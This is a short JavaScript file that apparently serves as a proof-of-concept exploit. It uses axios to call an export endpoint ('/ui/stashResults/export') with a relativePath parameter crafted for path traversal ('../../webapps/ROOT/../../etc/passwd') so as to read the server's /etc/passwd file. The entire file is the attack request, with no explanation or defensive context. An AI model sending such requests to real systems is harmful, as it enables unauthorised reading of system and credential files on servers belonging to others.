import axios from "axios";

const route = "/ui/stashResults/export";
const params = {
  "repoKey": "private-repository",
  "relativePath": "../../webapps/ROOT/../../etc/passwd",
};
axios.get(route, { params });
